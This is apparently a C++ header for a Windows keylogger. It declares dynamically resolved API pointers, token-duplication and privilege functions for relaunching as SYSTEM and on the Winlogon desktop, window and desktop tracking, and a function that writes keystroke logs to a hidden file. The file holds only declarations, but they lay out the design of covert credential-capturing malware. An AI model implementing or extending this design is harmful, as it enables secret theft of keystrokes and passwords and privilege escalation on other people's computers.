#pragma once
#include <string>
#include <windows.h>
#define WIN32_LEAN_AND_MEAN

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
extern pLoadLibraryA MyLoadLibraryA;

typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
extern pGetProcAddress MyGetProcAddress;

typedef BOOL(WINAPI* pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI* pGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pConvertSidToStringSidW)(PSID, LPWSTR*);
typedef BOOL(WINAPI* pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
typedef BOOL(WINAPI* pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL(WINAPI* pDuplicateTokenEx)(HANDLE, DWORD, PSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL(WINAPI* pCreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

bool isRunningAsSystem();

bool EnablePrivileges(LPCWSTR priv);
bool RelaunchAsSystem(const std::wstring cmdLine);
bool RelaunchWithWINLOGONDesktop(const std::wstring cmdLine);

std::wstring GetCurrentWindow();
std::wstring GetCurrentDesktopName();
std::wstring GetCurrentTimeAsString();

bool CreateDirectoryRecursive(const std::wstring& path);
bool WriteKeyLogToLogFileSystemHidden(const std::wstring &data);

std::wstring StringToWString(const std::string& str);
std::wstring ToLower(std::wstring str);



